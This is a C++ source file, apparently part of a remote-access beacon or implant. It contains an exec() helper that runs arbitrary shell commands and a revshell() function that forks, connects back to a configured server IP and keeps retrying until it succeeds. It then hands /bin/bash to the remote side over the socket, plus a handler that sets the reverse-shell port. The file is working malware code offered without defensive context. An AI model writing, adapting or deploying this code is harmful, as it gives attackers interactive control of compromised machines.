#include <string>
#include <vector>
#include <array>
#include <iostream>
#include <include/beacon.hpp>
#include <arpa/inet.h>
#include <unistd.h>

#define WAIT_FOR_CLIENT

typedef std::vector<std::string> ARGS;

std::string exec(const char* cmd){
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
    if (!pipe) {
        result = "popen() failed!";
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}


int revshell(int port){
    if (fork() == 0){
        struct sockaddr_in sa;
        sa.sin_family = AF_INET;
        sa.sin_port = htons(port);
        sa.sin_addr.s_addr = inet_addr(serv_ip_addr);
        int sockfd = socket(AF_INET, SOCK_STREAM, 0);
        int cf;
#ifdef WAIT_FOR_CLIENT
        while (connect(sockfd, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
            sleep(3);
        }
#else
        if ((cf = connect(sockfd, (struct sockaddr*)&sa, sizeof(sa))) != 0){
            return cf;
        }
#endif
        dup2(sockfd, 0); //bind stdin to sock
        dup2(sockfd, 1); //bind stdout to sock
        dup2(sockfd, 2); //bind stderr to sock

        char *const argv[] = {"/bin/bash", NULL};
        execve("/bin/bash", argv, NULL);
        exit(0);
    }
    return 0;
}

int rport;

int rs(ARGS args){
    if (args.size() != 1){
        return 1;
    }
    int p;
    try {
        p = std::stoi(args[0]);
    }
    catch (...){
        return 1;
    }
    rport = p;
    return 99; //stop accept signal
}